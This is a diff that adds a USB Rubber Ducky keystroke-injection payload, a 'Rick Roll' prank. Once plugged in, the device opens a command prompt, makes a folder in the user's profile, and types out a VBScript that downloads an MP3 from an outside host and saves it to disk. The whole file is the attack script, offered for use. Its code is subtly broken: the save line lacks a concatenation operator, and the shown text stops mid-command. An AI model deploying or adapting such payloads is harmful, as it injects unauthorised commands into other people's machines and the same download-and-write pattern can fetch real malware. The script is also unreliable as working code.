@@ -1,0 +1,48 @@
+REM Rick Roll by Thomas McNeela
+REM https://github.com/tommym89/Rubber-Ducky_RickRoll
+DELAY 8000
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 200
+REM create folder to hold payloads
+STRING mkdir "%USERPROFILE%\Music\tmp"
+ENTER
+REM write download script
+STRING cd %tmp% && copy con dlrick.vbs
+ENTER
+REM get user home directory
+ENTER
+STRING Dim oShell: Set oShell = CreateObject("WScript.Shell")
+ENTER
+STRING Dim PRFL: PRFL = oShell.ExpandEnvironmentStrings("%USERPROFILE%")
+ENTER
+REM initialize HTTP objects
+ENTER
+STRING Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
+ENTER
+STRING Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
+ENTER
+REM open mp3 stream
+STRING xHttp.Open "GET", "https://qoret.com/dl/uploads/2019/07/Rick_Astley_-_Never_Gonna_Give_You_Up_Qoret.com.mp3", False
+ENTER
+STRING xHttp.Send
+ENTER
+REM download and write to file
+STRING With bStrm
+ENTER
+STRING .type = 1
+ENTER
+STRING .open
+ENTER
+STRING .write xHttp.responseBody
+ENTER
+STRING .saveToFile PRFL   "\Music\tmp\rick.mp3", 2
+ENTER
+STRING End With
+ENTER
+DELAY 100
+CTRL Z
+ENTER
+STRING copy c
